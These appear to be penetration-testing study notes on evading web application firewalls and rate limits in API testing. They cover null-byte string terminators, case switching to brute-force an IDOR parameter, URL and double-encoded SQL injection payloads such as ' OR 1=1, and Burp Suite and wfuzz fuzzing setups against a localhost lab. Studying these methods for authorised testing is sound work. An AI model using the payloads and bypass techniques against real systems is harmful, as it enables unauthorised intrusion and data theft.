https://github.com/0xInfection/Awesome-WAF

## Intro
Often times security controls like web applications firewalls (WAFs) and rate-limiting can block your attacks. Security controls may differ from one API provider to the next, but at a high level, they will have some threshold for malicious activity that will trigger a response. WAFs, for example, can be triggered by a wide variety of things, like:

Too many requests for resources that do not exist.
Too many requests within a certain amount of time
Common attack attempts, like SQL injection and XSS attacks
Abnormal behavior, like tests for authorization vulnerabilities
Evading security controls is a process of trial and error. Some security controls may not advertise their presence with response headers; instead, they may wait in secret for your misstep. The following measures can be effective at evading or bypassing these restrictions.

## String Terminators
Null bytes and other combinations of symbols are often interpreted as string terminators used to end a string. If these symbols are not filtered out, they could terminate the API security control filters that may be in place. When you are able to successfully send a null byte it is interpreted by many back-end programming languages as a signifier to stop processing. If the null byte is processed by a back-end program that validates user input, then the security control could be bypassed because it stops processing the following input. Here is a list of potential string terminators you can use:

    %00

    0x00

    //

    ;

    %

    !

    ?

    []

    %5B%5D

    %09

    %0a

    %0b

    %0c

    %0e

String terminators can be placed in different parts of the request, like the path or POST body, to attempt to bypass any restrictions in place. For example, in the following injection attack to the user profile endpoint, the null bytes entered into the payload could bypass filtering

    POST /api/v1/user/profile/update

    […]

    

    {

    “uname”: “hapihacker”

    “pass”: "%00'OR 1=1"

    }

In this example, input validation measures might be bypassed due to the null byte placed before the SQL injection attempt.

## Case Switching
Sometimes API security controls are pretty easy to beat. If a security control is built around the literal spelling and case of the components within a request, then case switching can be an effective technique to bypass the controls. Case switching is the literal switching of the case of the letters within the URL path or payload. For example, take the following POST requests. Let’s say you were targeting a social media site by attempting an IDOR attack against a uid parameter in the following POST request:  

    POST /api/myprofile 

    […] 

    {uid=§0001§} 

 An API may leverage rate-limiting to only allow 100 requests per minute. Based on the length of the uid value, you know that to brute force it you’ll need to send 10,000 requests to exhaust all possibilities. To bypass rate-limiting or other WAF controls you may be able to simply alter the URL path by switching upper- and lower-case letters in the path: 

    POST /api/myProfile 

    POST /api/MyProfile 

    POST /aPi/MypRoFiLe 

 

Each of these path iterations could cause the API provider to handle the request differently, potentially bypassing the rate limit. In some cases, a control like rate-limiting may disappear completely with a different spelling or the new spelling may have its own renewed rate limit. In the case where rate-limiting is no longer applied, you can just send over as many requests as you need to the endpoint with the casing switched. In the case where rate-limiting is renewed, you could use the BurpSuite Pitchfork attack to pair a certain number of attacks to a certain number of brute-force attempts.

For example:

    POST /api/myprofile paired with uid 001 - 100

    POST /api/Myprofile paired with uid 101 - 200

    POST /api/mYprofile paired with uid 201 - 300

If you were using Burp Suite’s Intruder for this attack, you could set the Attack Type to Pitchfork and use the same value for both payload positions. This tactic allows you to use the smallest number of requests required to brute force the uid.  

## Encoding Payloads
To take your WAF-bypassing attempts to the next level, try encoding payloads. Encoded payloads can often trick WAFs while still being processed by the target application or database. Even if the WAF or an input-validation measure blocks certain characters or strings, they might miss encoded versions of those characters. Alternatively, you could also try double encoding your attacks.

Imagine that the API provider has a control in place that provides one round of decoding to requests that are received.

    URL Encoded Payload: %27%20%4f%52%20%31%3d%31%3b

    API Provider URL Decoder: 
    ' OR 1=1;

WAF Rules detect a fairly obvious SQL Injection attack and block the payload.

    Double URL Encoded Payload: %25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62


    API Provider URL Decoder: 
    %27%20%4f%52%20%31%3d%31%3b

This could perhaps pass by a bad WAF rule to later be decoded and interpreted.


## Trying evasion on Burp suite
1. Find a request and select a place for fuzzing.
        
        POST /workshop/api/merchant/contact_mechanic HTTP/1.1
        Host: localhost:8888
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
        Accept: */*
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate, br
        Referer: http://localhost:8888/contact-mechanic?VIN=0XRNQ34JNXI249639
        Content-Type: application/json
        Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0ZXJAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTcxMjQ3NDYzMCwiZXhwIjoxNzEzMDc5NDMwfQ.pY1PF5wW0wXFYde1kJIGLlrzjTGD_IMmrj2CTr3S_XDEp0myEiPrZNAZbD62RP21iw00ZofwkhauW7I6fm54pbnXKvhG7sOBCFIigsx6virBSiMpNBz8rnWCciWZCyEUL6Gh2qXZZkitLue62m4lBipyrsuqHCFMJjglgg2kDWcae4gC_9pLxcG6gmpmzJwD6qPTUMD7aOdQqJEFfqaSj-nMxL_0WeIXjY_CgJ5loJHIiDAzZC4YsHpQhXf5zQUIM6q0g8Xee3KfhWppboqKVkc0wY_FJgxxD_GthHG3ix5l1ekJSF99mDDz7Iy8Hs4CnS2rlx4_HgZ8yrNvndmo8g
        Content-Length: 212
        Origin: http://localhost:8888
        Connection: close
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin

        {"mechanic_code":"TRAC_JHN","problem_details":"§test§\n","vin":"0XRNQ34JNXI249639","mechanic_api":"http://localhost:8888/workshop/api/mechanic/receive_report","repeat_request_if_failed":false,"number_of_repeats":1}

2. Payloads > Payload Settings > Load > /usr/share/wfuzz/Injection/All.txt
3. Payloads> Payload Processing > Add > Add Suffix / Add Prefix / Add Encoding, etc. (**Change the order of payload processors to change how the payload will be processed first**)
4. Run the attack and observe the results.

## With Wfuzz
Use **wfuzz -e encoders** to look at all the encoders that wfuzz has to offer.

Add the encoder name after wordlist - 
    
    wfuzz -z file,wordlist/api/common.txt,base64 http://hapihacker.com/FUZZ
In this example, every payload would be base64-encoded before being sent in a request.

The encoder feature can also be used with multiple encoders. To have a payload processed multiple encoders specify them with a hyphen. For example, if you were to have a single payload “TEST” with the encoding applied like this:
    
    $ wfuzz -z list,TEST,base64-md5-none

Then you would receive one payload encoded to base64, another payload encoded by MD5, and a final payload in its original form (none=not encoded). This would result in three different payloads. Note that if you had three payloads, using a hyphen for three encoders would send nine total requests like this:

    $ wfuzz -z list,a-b-c,base64-md5-none -u http://hapihacker.com/api/v2/FUZZ

    000000002:   404        0 L      2 W        155 Ch      "0cc175b9c0f1b6a831c399e269772661"                                                       

    000000005:   404        0 L      2 W        155 Ch      "92eb5ffee6ae2fec3ad71c777531578f"                                                       

    000000008:   404        0 L      2 W        155 Ch      "4a8a08f09d37b73795649038408b5f33"                                                       

    000000004:   404        0 L      2 W        127 Ch      "Yg=="                                                                                                                                  

    000000007:   404        0 L      2 W        127 Ch      "Yw=="                                                                                    

    000000001:   404        0 L      2 W        127 Ch      "YQ==" 

    000000003:   404        0 L      2 W        124 Ch      "a"                                                                                        

    000000006:   404        0 L      2 W        124 Ch      "b"   

    000000009:   404        0 L      2 W        124 Ch      "c"        

In this case, the list of payloads was individually processed three different times. Each letter (a, b, and c)  was base64 encoded, hashed with md5, and sent in the original form.

If, instead, you want each payload to be processed by multiple encoders, separate the encoders with an @ sign

    -z list, TEST1, base64@base64@md5

In this example, Wfuzz would first create an MD5 hash of the payload (TEST1) and then base64 encode it twice. These Burp Suite and Wfuzz options will help you process your attacks in ways that help you sneak past whatever security controls stand in your way. 

